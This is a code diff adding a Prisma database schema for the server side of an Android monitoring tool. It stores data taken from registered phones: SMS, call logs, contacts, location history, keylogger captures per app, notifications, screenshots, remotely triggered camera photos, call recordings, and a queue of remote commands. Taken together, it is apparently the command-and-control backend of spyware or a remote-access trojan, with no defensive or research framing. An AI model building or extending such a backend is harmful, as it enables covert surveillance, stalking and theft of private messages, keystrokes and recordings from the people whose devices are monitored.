@@ -1,0 +1,207 @@
+generator client {
+  provider = "prisma-client-js"
+  binaryTargets = ["native", "debian-openssl-1.1.x", "rhel-openssl-1.0.x", "linux-musl-openssl-3.0.x"]
+}
+
+datasource db {
+  provider = "mysql"
+  url      = env("DATABASE_URL")
+}
+
+// Device model - represents a registered Android device
+model Device {
+  id             String   @id @default(uuid())
+  deviceId       String   @unique // Internal app UUID
+  androidId      String?  @unique // Physical device Android ID
+  fcmToken       String?  // Firebase Cloud Messaging token
+  model          String?  // Device model (e.g., "Samsung Galaxy S21")
+  manufacturer   String?
+  androidVersion String?
+  appVersion     String?
+  isOnline       Boolean  @default(false)
+  lastSeen       DateTime @default(now())
+  battery        Int      @default(100)
+  isCharging     Boolean  @default(false)
+  network        String?  // "WiFi", "Cellular", or "Offline"
+  createdAt      DateTime @default(now())
+  updatedAt      DateTime @updatedAt
+
+  // Relations
+  smsLogs        SmsLog[]
+  callLogs       CallLog[]
+  contacts       Contact[]
+  locations      Location[]
+  keylogs        Keylog[]
+  apps           AppInfo[]
+  notifications  NotificationLog[]
+  screenshots    Screenshot[]
+  photos         Photo[]
+  commands       Command[]
+  callRecordings CallRecording[]
+}
+
+// SMS messages
+model SmsLog {
+  id        String   @id @default(uuid())
+  deviceId  String
+  device    Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+  address   String   // Phone number
+  body      String
+  type      String   // "incoming" or "outgoing"
+  timestamp DateTime
+  syncedAt  DateTime @default(now())
+
+  @@index([deviceId, timestamp])
+}
+
+// Call logs
+model CallLog {
+  id        String   @id @default(uuid())
+  deviceId  String
+  device    Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+  number    String
+  name      String?  // Contact name if available
+  type      String   // "incoming", "outgoing", "missed"
+  duration  Int      // Duration in seconds
+  timestamp DateTime
+  syncedAt  DateTime @default(now())
+
+  @@index([deviceId, timestamp])
+}
+
+// Contacts
+model Contact {
+  id       String  @id @default(uuid())
+  deviceId String
+  device   Device  @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+  name     String
+  phone    String?
+  email    String?
+  syncedAt DateTime @default(now())
+
+  @@index([deviceId])
+}
+
+// Location history
+model Location {
+  id        String   @id @default(uuid())
+  deviceId  String
+  device    Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+  latitude  Float
+  longitude Float
+  accuracy  Float?
+  altitude  Float?
+  speed     Float?
+  timestamp DateTime
+  syncedAt  DateTime @default(now())
+
+  @@index([deviceId, timestamp])
+}
+
+// Keylogger data
+model Keylog {
+  id        String   @id @default(uuid())
+  deviceId  String
+  device    Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+  app       String?  // App package where text was typed
+  appName   String?  // Friendly app name
+  text      String
+  timestamp DateTime
+  syncedAt  DateTime @default(now())
+
+  @@index([deviceId, timestamp])
+}
+
+// Installed applications
+model AppInfo {
+  id          String   @id @default(uuid())
+  deviceId    String
+  device      Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+  name        String
+  packageName String
+  versionName String?
+  installDate DateTime?
+  isSystem    Boolean  @default(false)
+  syncedAt    DateTime @default(now())
+
+  @@unique([deviceId, packageName])
+  @@index([deviceId])
+}
+
+// Notification logs
+model NotificationLog {
+  id        String   @id @default(uuid())
+  deviceId  String
+  device    Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+  app       String   // Package name
+  appName   String?  // Friendly name
+  title     String?
+  text      String?
+  timestamp DateTime
+  syncedAt  DateTime @default(now())
+
+  @@index([deviceId, timestamp])
+}
+
+// Screenshots
+model Screenshot {
+  id        String   @id @default(uuid())
+  deviceId  String
+  device    Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+  filePath  String   // Path to stored file
+  fileName  String
+  fileSize  Int?
+  timestamp DateTime @default(now())
+
+  @@index([deviceId, timestamp])
+}
+
+// Photos captured remotely
+model Photo {
+  id        String   @id @default(uuid())
+  deviceId  String
+  device    Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+  filePath  String
+  fileName  String
+  fileSize  Int?
+  camera    String   // "front" or "back"
+  timestamp DateTime @default(now())
+
+  @@index([deviceId, timestamp])
+}
+
+// Commands sent to devices
+model Command {
+  id         String   @id @default(uuid())
+  deviceId   String
+  device     Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+  type       String   // Command type (e.g., "capture_screenshot")
+  payload    String?  // JSON payload
+  status     String   @default("pending") // "pending", "sent", "completed", "failed"
+  result     String?  // Result or error message
+  createdAt  DateTime @default(now())
+  executedAt DateTime?
+
+  @@index([deviceId, status])
+}
+
+// Call recordings
+model CallRecording {
+  id           String   @id @default(uuid())
+  deviceId     String
+  device       Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+  phoneNumber  String?
+  callType     String   // "incoming" or "outgoing"
+  duration     Int      // seconds
+  status       String   @default("uploaded") // "recording", "pending", "uploaded", "error"
+  audioData    String?  // Base64 encoded audio content (BigInt/Blob would be better but string is more flexible for SQLite/JSON)
+  fileName     String?  // Original filename
+  mimeType     String?  @default("audio/mpeg")
+  fileUrl      String?  // URL to download recording (can be data URI or server proxy)
+  filePath     String?  // Server storage path
+  fileSize     Int?     // bytes
+  recordedAt   DateTime @default(now())
+  uploadedAt   DateTime @default(now())
+
+  @@index([deviceId, recordedAt])
+}
